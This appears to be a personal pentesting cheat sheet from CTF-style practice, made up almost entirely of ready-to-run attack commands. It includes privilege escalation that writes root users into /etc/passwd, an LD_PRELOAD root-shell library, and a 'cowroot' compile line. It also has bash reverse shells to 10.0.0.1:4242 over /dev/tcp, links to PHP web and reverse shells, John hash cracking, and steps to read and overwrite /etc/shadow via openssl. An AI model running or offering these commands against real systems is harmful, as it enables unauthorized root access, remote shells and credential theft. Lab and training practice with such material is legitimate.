# Tracking the Various Tips and Tracks learned along the way


### Adding a user to /etc/passwd  

```bash
#hacker:myhackerpass
echo hacker:$(( echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> passwd
tar -cvf passwd.tar passwd
tar -xvf passwd.tar -C /etc/
# Using make with suid
make -s --eval="\$(file >> /etc/passwd,hacker5:\$\$1\$\$mysalt\$\$7DTZJIc9s6z60L6aj0Sui.:0:0:/:/bin/bash)" .
```

### Finding SUID   

- `find / -perm -u=s -type f 2>/dev/null`
- `find / -type f -perm -4000 2>/dev/null`

  
### Compiling a shell  

```c
/*
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
used to LD_PRELOAD shell.so
*/

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF
```

`gcc cowroot.c -o cowroot -pthread`
### Cracking Passwords with John  

- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format:RAW-SHA1`
- `john --list=formats`
- [Hash Formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)
- [hash-identifier](https://hashes.com/en/tools/hash_identifier)

### Cracking Passwords with Hashcat

- [Examples](https://hashcat.net/wiki/doku.php?id=example_hashes)

### Upgrading a shell

- `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- `python -c 'import pty; pty.spawn("/bin/sh")'`

### Reverse Shells

- `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
- `0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196`
- `/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1`
- https://github.com/flozz/p0wny-shell
- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- https://pentestmonkey.net/tools/web-shells/php-reverse-shell

### Nmap Scans

- `sudo nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p-`

### File Transferring

- `python3 -m http.server 80`

### Wordpress Vulnerability Scans

`wpscan --url 10.x.x.x`

### Overwriting /etc/shadow with OpenSSL

```bash
# Create keys in /tmp for easy access
cd /tmp
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Switch serving directory to /
cd /

# Start https content server with generated certs
openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP

# In another local shell, retrieve /etc/shadow
curl -k https://localhost:1337/etc/shadow

# Modify root password with `hash:password` - `$1$mysalt$7DTZJIc9s6z60L6aj0Sui.` = myhackerpass
# Alternatively - openssl passwd -6 -salt xyz  yourpass ; -6 = SHA-512, -5 = SHA-256 and -1 = MD5

# Encrypt shadow file
openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem

# Set back to root directory for restoring /etc/shadow
cd /

# Restore encrypted shadow file to /etc/shadow
openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/key.pem -out /etc/shadow
```
